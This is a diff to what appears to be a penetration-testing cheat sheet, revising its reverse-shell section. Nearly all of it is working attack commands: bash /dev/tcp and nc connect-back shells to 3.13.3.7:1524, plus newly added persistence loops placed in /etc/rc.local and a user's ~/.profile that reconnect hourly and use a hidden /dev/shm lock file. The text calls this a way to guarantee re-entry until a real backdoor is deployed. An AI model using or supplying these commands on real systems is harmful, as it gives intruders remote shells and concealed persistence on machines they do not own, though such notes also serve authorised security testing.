@@ -329,7 +329,7 @@ $ nc -nvlp 1524
 
 On the remote system, this command will connect back to your system (IP = 3.13.3.7, Port 1524) and give you a shell prompt:
 ```
-$ bash -i &>/dev/tcp/3.13.3.7/1524 0>&1
+$ setsid bash -i &>/dev/tcp/3.13.3.7/1524 0>&1 &
 ```
 
 <a id="rswob-anchor"></a>
@@ -442,16 +442,25 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:3.13.3.7:1524
 <a id="bdrs-anchor"></a>
 **6.i. Background reverse shell**
 
-A reverse shell that keeps trying to connect back to us every 3600 seconds (indefinitely). Often used until a real backdoor can be deployed and guarantees easy re-entry to a system in case our connection gets disconnected. Add to */etc/rc.local* if required...
+A reverse shell that keeps trying to connect back to us every 3600 seconds (indefinitely). Often used until a real backdoor can be deployed and guarantees easy re-entry to a system in case our connection gets disconnected. 
 
 ```
-$ (while :; do nc -e /bin/bash -vn 3.13.3.7 1524; sleep 3600; done ) &>/dev/null &
+$ while :; do setsid bash -i &>/dev/tcp/127.1/1524 0>&1; sleep 3600; done &>/dev/null &
 ```
 
-Or
+or add to */etc/rc.local*:
 ```
-$ screen -d -m /bin/bash -c 'while :; do bash -i &>/dev/tcp/3.13.3.7/1524 0>&1; sleep 3600; done'
+nohup bash -c 'while :; do setsid bash -i &>/dev/tcp/127.1/1524 0>&1; sleep 3600; done' &>/dev/null &
 ```
+
+or the user's *~/.profile* (also stops multiple instances from being started):
+```
+fuser /dev/shm/.busy &>/dev/null
+if [ $? -eq 1 ]; then
+        nohup /bin/bash -c 'while :; do touch /dev/shm/.busy; exec 3</dev/shm/.busy; setsid bash -i &>/dev/tcp/3.13.3.7/1524 0>&1 ; sleep 3600; done' &>/dev/null &
+fi
+```
+
 
 <a id="bdak-anchor"></a>
 **6.ii. authorized_keys**
